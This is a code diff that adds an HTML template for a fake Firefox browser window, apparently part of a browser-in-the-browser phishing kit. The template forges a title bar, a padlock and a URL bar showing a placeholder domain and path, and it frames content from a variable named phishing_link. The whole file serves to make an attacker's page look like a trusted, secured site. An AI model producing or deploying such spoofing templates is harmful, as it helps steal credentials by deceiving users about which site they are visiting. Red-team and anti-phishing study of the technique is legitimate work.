@@ -1,0 +1,27 @@
+<div id="window" name="{{ type }}" style="margin:auto; position: absolute; bottom: 2.5%; display: none; top: 100px; left: 25%; background-color: white;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="static/images/firefox_logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">{{ title }} - Firefox</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="static/images/sec_shield.png" width="25px" height="15px" id="ssl-padlock">
+		<img src="static/images/ssl.svg" width="25px" height="25px" id="ssl-padlock">
+		<span id="domain-name">{{ domain }}</span>
+		<span id="domain-path">{{ path }}</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="{{ phishing_link }}" frameBorder="0"></iframe>
+</div>
+
+
